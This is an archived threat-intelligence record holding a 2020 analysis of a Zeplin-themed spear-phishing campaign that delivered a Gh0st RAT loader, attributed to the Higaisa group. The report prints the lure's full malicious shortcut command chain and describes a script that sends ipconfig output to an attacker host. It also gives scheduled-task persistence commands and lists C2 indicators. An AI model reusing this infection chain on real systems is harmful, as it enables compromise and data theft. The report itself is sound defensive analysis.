{
    "id": "d25931ab-86c4-4625-a1a9-011e5e728e3c",
    "created_at": "2023-01-12T15:06:49.320921Z",
    "updated_at": "2025-03-27T02:15:41.801617Z",
    "deleted_at": null,
    "sha1_hash": "c946dd381b570daa8368bdcdb95cc3035293b00e",
    "title": "2020-06-05 - The Gh0st Remains the Same",
    "authors": "",
    "file_creation_date": "2022-10-02T12:18:29Z",
    "file_modification_date": "2022-10-02T12:18:29Z",
    "file_size": 3521921,
    "plain_text": "# The Gh0st Remains the Same\n\n**prevailion.com/the-gh0st-remains-the-same-2/**\n\n5 June 2020\n\n## Executive Summary\n\n\nJune 5, 2020\n\n\nPrevailion’s Tailored Intelligence Team has detected a new advanced campaign dubbed –\n“The Gh0st Remains the Same.” This first campaign likely commenced between May 11th\nand 12th, 2020. In this engagement, the victims received a compressed RAR folder that\ncontained trojanized files. If the malicious files were engaged, they displayed decoy web\npages associated with the software company “Zeplin”. Zeplin is a software company that\ndeveloped a platform to create a “connected space for product teams,” and boasts over\nthree million customers. Some of Zeplin’s more prominent users include: Starbucks, Airbnb,\nSlack, Dropbox, Pinterest, Shopify, Feedly and MailChimp. It is likely they chose to simulate\ncollaboration-based software with a sizable user base, as a result of the increase in working\nfrom home (WFH) during the global pandemic.\n\nThis is a user-initiated infection, in this case the lure was a folder called “Project link and\nNew copyright policy.rar”. Once decompressed, this folder contains two Microsoft shortcut\nfiles and a PDF, all of which reference the Zeplin platform. If the shortcut file was initiated it\nwould begin a multistep infection chain that ultimately deployed a Ghost rat agent. This\n\n\n-----\n\nagent persisted on an infected machine by employing a scheduled task, while\nmasquerading as a legitimate binary in the Windows startup folder. During the infection\nprocess, the subject machine communicated with three different remote command and\ncontrol (C2) nodes. There were also indications that the agents could communicate over\nDNS as well as HTTP protocols.\n\nWe assess that the threat actor group is both technically proficient and experienced, based\nupon the Tactics, Techniques and Procedures (TTPs) displayed in this campaign – such as\nsplitting up the attack into a myriad of steps and XORing parts of the payload to suppress\nthe antivirus software detection rate. The threat actors exercised good tradecraft by keeping\ntheir malicious domains online for just a few days after the campaign started. The sample in\nquestion was uploaded to VirusTotal on May 12th, likely indicating when it was observed in\nthe wild, and on the same day that the Zeplin Platform launched their new program “Zeplin\nAgency Members.” Furthermore, we observed a subsequent campaign employing the same\ninfection process, that commenced on 30 May 2020. This particular campaign differed in its\nuse of a trojanized Curriculum Vitae (CV) impersonating a college student named “Wang\nLei” from Hong Kong, and the use of a hard-coded IP address in lieu of a threat actor\ncontrolled domain.\n\nThrough analyzing the timestamps, we noticed that they align with the +8 time zone.\nAdditionally, we noticed a number of correlations between this campaign and\na [“Coronavirus (COVID-19) Situational Report” campaign that occurred earlier this year that](https://www.anomali.com/blog/covid-19-themes-are-being-utilized-by-threat-actors-of-varying-sophistication)\n[was associated with Higaisa. Those correlations were significant enough that we assess](https://malpedia.caad.fkie.fraunhofer.de/actor/higaisa)\nwith moderate confidence that Higaisa is also behind this campaign. Prior\nreporting suggests that the Higaisa group is likely government sponsored.\n\n## Technical Details\n\n Introduction\n\nPrevailion’s tailored intelligence team discovered a campaign that highlights an elegant use\nof commercially available tools by an advanced adversary. We suspect this actor\nintentionally chose commercially available frameworks to provide a level of anonymity and\nplausible deniability. If the malicious files were engaged, they displayed decoy web pages\nassociated with the software company Zeplin. Zeplin is a software company that developed\na platform to create a “connected space for product teams” and boasts over three million\ncustomers. It is likely they chose to simulate collaboration-based software with a sizable\nuser base, as a result of the increase in working from home (WFH) during the global\npandemic. By analyzing google trends, we noted that the Zeplin app was of interest in the\nUnited States, United Kingdom, and India, which possibly hint at the targeted entities.\n\n\n-----\n\n_Google Trends for Zeplin App_\n\nThe threat actors appeared to create the decoy file seven days prior to the malicious files\nbeing observed in the wild. They also took down their infrastructure a short time after the\nattack began – highlighting an acute level of situational awareness. We assess that the\ncampaign likely commenced between May 11th, 01:03:02 and May 12th 17:59:57. The rar\nfile was first uploaded to VirusTotal on May12th at 17:59:57, which likely denotes when the\nsample was first observed. It’s unclear if it was intentional, or simply fortuitous, that the\ncampaign occurred the same day that the Zeplin Platform launched their new “Zeplin\nAgency Members”. Such an announcement could conceivably result in copyright provisions\nchange, which would be unlikely to draw scrutiny from their established user base.\n\n## Campaign Timeline\n\nMay 5th the PDF file “Zeplin Copyright Policy” was created 2020:05:06 08:37:39\nMay 6th the contents of PDF file “Zeplin Copyright Policy” were last modified 00:37:41\nMay 8th files svchast.exe and 3t54dEr.tmp were created at the same time 23:17:58\nMay 9th the domain comcleanner dot info starts to resolve to the dedicated VPS\nMay 11th the lnk microsoft link file was created by the threat actors 01:03:02\nMay 11th-12th, the victims received the trojanized RAR file\nMay 12th Zeplin announcement “Introducing Zeplin Agency Members” at 12:03\nMay 12th The file “Project link and New copyright policy.rar” was first submitted to VT\n17:59:57\n\n\n-----\n\nMay 16th the domain comcleanner dot info stopped resolving\n\n_Campaign Timeline Graphic_\n\n## Infection Vector\n\n_Infection chain used in the May 2020 Campaign_\n\nThe infection chain began when the victims received an rar file named “Project link and\nNew copyright policy.rar”. Once the file was decompressed, the folder contained two\nmicrosoft shortcut (lnk) files and a PDF file. The three files were named:\n\nZeplin Copyright Policy.pdf\nConversations – iOS – Swipe Icons – Zeplin.lnk\nTokbox icon – Odds and Ends – iOS – Zeplin.lnk\n\n\n-----\n\nThe PDF file Zeplin Copyright Policy, which was benign, was taken from the Zeplin public\nwebsite. The actor used the tool [wkhtmktopdf to convert the website to a PDF on May 5th](https://wkhtmltopdf.org/)\nat 09:37:39 UTC. They then modified the file the following day, May 6th 00:37:41; the only\ndifference between the website and PDF was the last updated line. In the actor-modified\nversion, the last updated line was dated “1 May 2020”, while the Zeplin website listed the\nlast updated line as “18 October 2019”. We assess that its purpose was to act as a decoy,\nin case the PDF was examined further by security products.\n\n_Image of the modified PDF file that was displayed to victims_\n\nThe victim is then enticed to click on one of the Microsoft shortcut files that executes a\nseries of commands which begins the attack. The Microsoft shortcut file’s properties and\npurpose will be explored in the following section. The lnk file contained a “decoy”\ncomponent, and would open a web browser to display a webpage hosted on the zeplin.io\n\n\n-----\n\ndomain,\nhttps://app.zeplin.io/project/5b5741802f3131c3a63057a4/screen/5b589f697e44cee37e0e61df.\nWhen visited this webpage was only accessible to a certain organization.\n\n_A copy of the aforementioned decoy Zeplin web page when visited by an outside account_\n\n### Microsoft Link Lures\n\nThe Prevailion team first analyzed the metadata properties of the lnk files to look for any\nartifacts that might have been left by the file creator. We found that almost all such\nmetadata had been intentionally stripped out by the adversary. [Typically LNK files contain](https://www.fireeye.com/blog/threat-research/2020/02/the-missing-lnk-correlating-user-search-lnk-files.html)\nuseful information about the originators computer such as Machine ID, Drive serial\nnumbers, Mac Address, Volume, and file systems. However the only thing left in these two\nsamples was the creation date of the file May 11th, 2020, timestamp 08:03:01.0 [UTC] and\nthe date the C drive was created 03/18/2019 (21:37:44.0) [UTC].\n\n\n-----\n\nWhen the file is executed, it pulls a block of data from the lnk file and saves it as\ncSi1rouy.tmp. It will then base64 decode that data, which reveals a Microsoft Cabinet file\n(.cab). Microsoft Cabinet files are “an archive-file format for Microsoft Windows that\nsupports lossless data compression and embedded digital certificates used for maintaining\narchive integrity.” Once the cabinet file is decompressed it reveals four more files:\n\n34fDFkfSD32.js\nSvchast.exe (Note this was the threat actor’s spelling of the file)\n3t54dE3r.tmp\nConversations – iOS – Swipe Icons – Zeplin.url\n\nA copy of the full command line argument has been copied below.\n\nC:\\Windows\\System32\\cmd.exe /c copy “Conversations – iOS – Swipe Icons – Zeplin.lnk”\n%temp%\\g4ZokyumB2DC.tmp /y& for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy\n%i %temp%\\gosia.exe /y& findstr.exe /b “TVNDRgA”\n%temp%\\g4ZokyumB2DC.tmp>%temp%\\cSi1rouy.tmp&%temp%\\gosia.exe -decode\n%temp%\\cSi1rouy.tmp %temp%\\o423DFDS.tmp&expand %temp%\\o423DFDS.tmp -F:*\n%temp%&”%temp%\\Conversations – iOS – Swipe Icons – Zeplin.url”&copy\n%temp%\\3t54dE3r.tmp C:\\Users\\Public\\Downloads\\3t54dE3r.tmp&Wscript\n%tmp%\\34fDFkfSD32.js&exit\n\nIcon location (UNICODE):\n\nC:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\n\n### Javascript File\n\nThe last function of the command line is to initiate the javascript file “34fDFkfSD32.js.” The\njavascript file spawns a hidden command shell, runs ipconfig and redirects the output to a\nfile called “d3reEW.txt”. The file is then sent to a presumed threat actor hostname\nhxxp://zeplin[.]atwebpages[.]com/inter.php after sleeping for 1000 seconds.\n\nNext, the javascript file copies svchast.exe to the Windows Startup folder, that file path was:\n\n%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\officeupdate.exe\n\nCopying the malicious file to this path is significant for two reasons. First, it allows for\npersistence on the infected machine, as the programs inside this folder are automatically\ninitiated upon start up. Second, it was intended to blend into the target environment by\nmasquerading as the legitimately signed Microsoft program officeupdate.exe,\nsha1:7fc78cce74b31414278444eff8c99156d98c2bcd. In order to have some redundancy,\nthe threat actor copies the loader file, svchast.exe, to the downloads folder and renames it\n\n\n-----\n\nofficeupdate.exe. They created a scheduled task with the name Driver Booster Update to\nrun every two hours and execute the officeupdate.exe file located in the downloads folder.\nFinally, it launches the svchast.exe file through a command shell.\n\n## Loader And ShellCode\n\nFor the sake of clarity, I will continue to call this particular file svchast.exe, in order to\nprevent confusion with the legitimate binary officeupdate.exe. Svchast was designed as a\nWin64 portable executable (pe) file, that had a time stamp listed as 2018:08:28 01:57:5507:00. Upon further analysis, the last modification date was listed 2020:05:08 23:17:5807:00, three days prior to the lnk file being created. This file loads the main\npayload,3t54de.tmp, from the Downloads folder where it was placed by the aforementioned\njavascript. Svchast.exe would check the file type and size. The loader will determine if it is\nbeing run in a debugger, as an anti-analysis check. If it is, the file will cease execution. If the\nfile is not being run in a debugger, it will then XOR decode a section of the 3t54dE3r.tmp file\nwith the key 0xCF. Once complete, it injects into the running process.\n\n_Function loading the 3t54de.tmp file on the left, Anti-debugging function on the right_\n\nThe last file to discuss is 3t54de.tmp, which was located in the previously mentioned\nMicrosoft Cabinet file. This appeared to be a shellcode that contained the threat actor C2\nnode. It performs some host based enumeration upon the infected machine, then\nestablishes a persistent connection between the infected host and the C2.\n\nThis appeared to be an evolution of the previous loader\n(sha1:640682ef5b228d940634d161b7038ad002288aca) that was used by the Higaisa in\n2019, where it was all one compiled executable. By using the process injection method, the\n\n\n-----\n\nthreat actor lowered its detection rate. As of May 22, only 3 antivirus engines out of 73\ndetected the svchast file as being malicious, and 3t54de.tmp had a detection rate of zero.\n\nDuring our analysis of the aforementioned sample, we identified an embedded URL\nhxxps://comcleanner[dot]info/msdn.cpp. Unfortunately the threat actor stopped resolving the\ndomain approximately four days after the campaign started, therefore we were unable to\nenumerate any subsequent payloads. We did attempt to create a honey-pot machine\nhowever we were not served the malicious payload, for either this campaign or the “Collin\nCV Campaign.” We ran the CV sample on Friday May 29th, the day the sample was first\nuploaded to Virustoal. We were not able to locate a file by that name in our malware\n[repositories. In previous reporting, the threat actors were noted deploying an in-memory](https://pc1.gtimg.com/softmgr/files/higaisa_apt_report.pdf)\nversion of the Gh0st rat payload. It should be noted that the source code for this agent has\nbeen [available online since 2008.](https://www.bluvector.io/threat-report-gh0st-rat-trojan-evolves-with-apt-groups/)\n\nOne interesting note was that files ending in the extension .cpp, typically indicates a file\ncontaining code written C++. However we did find one reference to the file “msdn.cpp.” It\n[appeared in a tweet by @bad_packets, where they observed mass scanning for that URL](https://twitter.com/bad_packets/status/1148762019186610176?s=20)\n[by an undisclosed security researcher that operates the domain Tequillaboomboom dot](https://www.linode.com/blog/linode/a-new-policy-to-help-fight-spam/)\nclub.\n\n### Command and Control Communications\n\nAnother compelling detail we observed was the threat actor configured redundant\ncommunications channels during this particular campaign. The first command and control\nnode employed was the hostname hxxp://zeplin[.]atwebpages[.]com/inter.php – which\nwould receive the output of the ipconfig command. While this might seem trivial, this could\nbe used as a filtering mechanism by the threat actor to determine if they compromised their\nintended target’s workstation. This method can confirm that they are not interacting with a\nhoneypot machine. They could also determine if something had run afoul, if they see\nconnections to the subsequent C2 from an IP address not in the first one. In order to\ndisguise their malicious hostname to appear more legitimate, the threat actors cloned a\ntemplated resume web page from bootstraptemple.com.\n\n\n-----\n\n_Resume web page from BootstrapTemple to the left, actor controlled website to the right_\n\nThe payload interacts with two supplementary C2 nodes. First contact is with the\nauthoritative name server, in order to obtain the IP address for the embedded domain\ncomcleanner[dot]info. In this particular case, the authoritative name server was\nns1[dot]comcleanner[dot]info. Querying this name server would return the IP address\n66.42.96[.]115 for the domain comcleanner[dot]info. When we ran a query on the IP\naddress 66.42.96[.]115 in Zetalytics, we noticed that the domain comcleanner[dot]info\nstopped resolving to it on May 15th, 2020. We thought it was of interest that the domain\nonly resolved for a small 6 day window in total, and was likely taken down a few days after\nthe initial campaign began. We feel this shows that the threat actor behind this campaign\nexhibited a high degree of operational security, and that the threat actor may have changed\nC2 nodes once they infected the target.\n\nOne other notable fact was that the name server ns1[dot]comcleanner[dot]info was also\nhosted on a dedicated VPS, at IP address 45.76.31[.]159. If they did once again use the\nGh0st rat payload, as in previous campaigns, they would have the ability to perform DNS\ntunneling. We assess this was likely configured as an alternate communications channel, if\nthey had trouble communicating with the infected device through the standard HTTP\nprotocol.\n\n## Correlations to Known Threat Activity \n\nWhile this operation did not employ a new trojan, they utilized multiple files in different\nformats to break the attack up into a myriad of steps, rather than just using one stand alone\nexecutable. This technique allowed them to keep the detection rate low and their trojan\nremained undetected. They also made efforts to complicate some aspects of analysis; such\n\n\n-----\n\nas removing metadata from the lnk files, timestomping the executable, and adding\ndebugger checks. These tactics lead us to assess that this campaign was performed by a\nsophisticated threat actor.\n\nBy analyzing individual elements of this campaign, we noted a number of correlations to\nprior threat actor reporting. Some of the more interesting data points came from the\ntimestamps left behind by the originator. We found the decoy PDF file to be particularly\nrevealing, the metadata extracted through ExifTools is listed below.\n\nExifTool Version Number     : 11.87\n\nFile Name                : Zeplin Copyright Policy.pdf\n\nDirectory                 : .\n\nFile Size                 : 27 kB\n\nFile Modification Date/Time   : 2020:05:06 00:37:41-07:00\n\nFile Permissions           : rw-r–r–\n\nFile Type                 : PDF\n\nFile Type Extension         : pdf\n\nMIME Type               : application/pdf\n\nPDF Version              : 1.4\n\nLinearized                : No\n\nTitle                     : Zeplin Copyright Policy | Zeplin\n\nCreator                  : wkhtmltopdf 0.12.5\n\nProducer                 : Qt 4.8.7\n\nCreate Date               : 2020:05:06 09:37:39+02:00\n\nPage Count               : 1\n\nPage Mode               : UseOutlines\n\nTwo particular data points from this PDF were the “Create Date” and the “FIle Modification\ndate/time.” The create date shows that this file was created on May 6th at 09:37:39 UTC,\nand was last modified the following day at 00:37:41 UTC. We noticed that these times align\nwith the +8 timezone, which is used in the Korean peninsula among other\n\n\n-----\n\n[countries. Porting these times from UTC to the +8 timezone, the file would have been](https://www.worldtimebuddy.com/)\ncreated at approximately 5:37 PM. After the file was created, the actor likely went home for\nthe night and then subsequently modified it the following morning when they arrived at work\nat 8:37 am local time.\n\nWe observed similar TTPs displayed earlier this year in a separate Coronavirus (COVID-19)\n[themed campaign that was reported here. We noted parallels in the Microsoft shortcut](https://securityaffairs.co/wordpress/99977/apt/apt27-abusing-covid-19.html)\ncommand syntax, embedding a Microsoft Cabinet file within a lnk file, and the use of\nJavascript.\n\nBased upon the totality of available information, we assess with high confidence that this\ncampaign was performed by the same actors responsible for the Coronavirus, Covid-19,\nthemed campaign in March. Based upon the timestamp analysis and the overlapping\n[infrastructure between the Anomali and](https://www.anomali.com/blog/covid-19-themes-are-being-utilized-by-threat-actors-of-varying-sophistication) [Tencent report, we assess with moderate](https://s.tencent.com/research/report/836.html)\nconfidence that this cluster was associated with Higaisa. Previous reporting suggests that\n[the Higaisa group has been active since 2016. Our assessment would be bolstered by](https://github.com/RedDrip7/APT_Digital_Weapon/tree/master/Higaisa)\nuncovering subsequent agents deployed in this operation as well as associating\nsubsequent campaigns to this cluster of activity.\n\n## Conclusion\n\nWhile none of the tools used in this particular campaign were completely new or innovative,\nwe believe that the threat actor made the most of every tool they used and was likely able\nto avoid detection. They also created the Zeplin lure, in order to pry upon the current\nsituation and take advantage of the collaborative software in a WFH environment. However,\nthrough careful examination of these artifacts, analysts can find little clues to help them gain\na better understanding of the campaign. In order to curtail these nefarious efforts, we\nrecommend that all users exercise great caution when receiving emails from an unknown\nsource. We also advise against executing any Microsoft shortcut links, especially from\nuntrusted sources. We recommend enabling and updating antivirus services, since this\nthreat actor relied upon commercially available toolkits. Where viable, increase monitoring\nnetwork logs for remote connections to VPS providers.\n\n## Indicators of Compromise\n\n**First Campaign**\n\nProject link and New copyright policy.rar\n\nsha256:C3a45aaf6ba9f2a53d26a96406b6c34a56f364abe1dd54d55461b9cc5b9d9a04\n\nZeplin Copyright Policy.pdf – (benign file)\n\nsha256:75cd8d24030a3160b1f49f1b46257f9d6639433214a10564d432b74cc8c4d020\n\n\n-----\n\nConversations – iOS – Swipe Icons – Zeplin.lnk\n\nsha256:C0a0266f6df7f1235aeb4aad554e505320560967248c9c5cce7409fc77b56bd5\n\nTokbox icon – Odds and Ends – iOS – Zeplin.lnk\n\nsha256:1074654a3f3df73f6e0fd0ad81597c662b75c273c92dc75c5a6bea81f093ef81\n\ncSi1rouy.tmp – Microsoft Cab file\n\nsha256:A541eed95ecffca5b6dbfa0e0f49376beaa497823d9fbd165baa6e4c107e53d4\n\nConversations – iOS – Swipe Icons – Zeplin.url (benign file)\n\nsha256:bcfff6c0d72a8041a37fe3cc5c0233ac4ef8c3b7c3c6bca70d2fcfaed4c5325e\n\n34fDFkfSD32.js\n\nsha256:0deb252a5048c3371358618750813e947458c77e651c729b9d51363f3d16b583\n\nSvchast.exe a.k.a. Malicious officeupdate.exe\n\nsha256:35a1ff5b9ad3f46222861818e3bb8a2323e20605d15d4fe395e1d16f48189530\n\n3t54dE3r.tmp\n\nsha256:8e6945ae06dd849b9db0c2983bca82de1dddbf79afb371aa88da71c19c44c996\n\n**Command and Control**\n\nhxxp://zeplin[.]atwebpages[.]com/inter.php\n\nhxxps://www[.]comcleanner[.]info/msdn.cpp\n\nIP address: 66.42.96[.]115\n\nns1[.]comcleanner[.]info\n\nIP address: 45.76.31[.]159\n\n**Second campaign**\n\nCV_Colliers.rar\n\nsha256:df999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6d\n\nInternational English Language Testing System certificate.pdf.lnk\n\nsha256:C613487a5fc65b3b4ca855980e33dd327b3f37a61ce0809518ba98b454ebf68b\n\n\n-----\n\nCurriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnk\n\nsha256:50d081e526beeb61dc6180f809d6230e7cc56d9a2562dd0f7e01f7c6e73388d9\n\nsha256:dcd2531aa89a99f009a740eab43d2aa2b8c1ed7c8d7e755405039f3a235e23a6\n\nCabinet File\n\nsha256:518000675a95158113acd23d86249c8f60ad9863624b15b072dc2e7eef4e70ce\n\n34fDFkfSD38.js\n\nsha256:dca8fcb7879cf4718de0ee61a88425fca9dfa9883be187bae3534076f835a54d\n\nsvchast.exe\n\nsha256:a251069b3fccd528cf2ce8ed36d814e974068fb4a1d9a5e67a4eb8fffa09e938\n\n66DF3DFG.tmp\n\nsha256:4733d1204b06dc95178e83834af61934a423534e1d4edd402b37e226f0f2727f\n\n**Command and Control**\n\nhxxp://goodhk[.]azurewebsites[.]net/inter.php\n\nhxxps://45.76.6[.]149/msdn.cpp\n\n**Third Campaign**\n\nUnidentified Campaign Likely occurring January 2020\n\n7zip file\n\nsha256:2990c8832626ab5e7b39ddfd39f2901fc7f511acee79cda040d3d56b646b61d9\n\nsvchosl.exe\n\nsha256:022be9c0bff25bb86b2e2d0907e1e45c76d1375c80f5d38b0588f5a41683ecdf\n\nsvchosl.bin\n\nsha256:Afee9da28c06c5f0a2b8cfdaf5b59ebdb2e5a8c0899fee529babbbdee25ccc7c\n\n**Command and Control**\n\nhxxps://mlcrosoft[.]site/msdn.cpp\n\nns1[ ]mlcrosoft[ ]site\n\n\n-----\n\nIP address:149.28.78[.]89\n\n**Host Based Indicators**\n\nschtasks /create /SC minute /MO 120 /TN “Driver Bootser Update”\n\nschtasks /create /SC minute /MO 120 /TN “Office update task”\n\nC:\\\\Users\\\\Public\\\\Downloads\\\\officeupdate.exe\n\nC:\\\\Users\\\\Public\\\\Downloads\\\\d3reEW.txt\n\nC:\\\\Users\\\\Public\\\\Downloads\\\\3t54dE.tmp\n\nC:\\\\Users\\\\Public\\\\Downloads\\\\66DF3DFG.tmp\n\nC:\\\\Users\\\\Public\\\\Downloads\\\\svchosl.bin\n\n%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\officeupdate.exe\n\n**MITRE ATT&CK**\n**Framework Mapping**\n\n**Tactic** **Technique**\n\nInitial Access SpearPhishing Attachment (T1193)\n\nExecution User Execution (T1204)\n\nPersistent Scheduled Task (T1053), Startup item (T1165)\n\nDefensive Evasion Masquerading (T1036), Process Injection (T1055), TimeStomp\n(T1009)\n\nCollection Data from Local System (T1005)\n\nCommand & Control Commonly used port (T1043), Web service (T1102),\nRemote File copy (T1105), Fallback Channels (T1008)\n\nExfiltration Exfiltration Over Command and Control Channel (T1041),\nExfiltration over Alternative Protocol (T1048)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-05 - The Gh0st Remains the Same.pdf"
    ],
    "report_names": [
        "2020-06-05 - The Gh0st Remains the Same.pdf"
    ],
    "threat_actors": [
        {
            "id": "873919c0-bc6a-4c19-b18d-c107e4aa3d20",
            "created_at": "2023-01-06T13:46:39.138138Z",
            "updated_at": "2025-03-27T02:00:03.005534Z",
            "deleted_at": null,
            "main_name": "Higaisa",
            "aliases": [],
            "source_name": "MISPGALAXY:Higaisa",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "30c9c492-afc6-4aa1-8fe6-cecffed946e0",
            "created_at": "2022-10-25T15:50:23.400822Z",
            "updated_at": "2025-03-27T02:00:55.461334Z",
            "deleted_at": null,
            "main_name": "Higaisa",
            "aliases": [
                "Higaisa"
            ],
            "source_name": "MITRE:Higaisa",
            "tools": [
                "PlugX",
                "certutil",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536009,
    "ts_updated_at": 1743041741,
    "ts_creation_date": 1664713109,
    "ts_modification_date": 1664713109,
    "files": {
        "pdf": "https://archive.orkl.eu/c946dd381b570daa8368bdcdb95cc3035293b00e.pdf",
        "text": "https://archive.orkl.eu/c946dd381b570daa8368bdcdb95cc3035293b00e.txt",
        "img": "https://archive.orkl.eu/c946dd381b570daa8368bdcdb95cc3035293b00e.jpg"
    }
}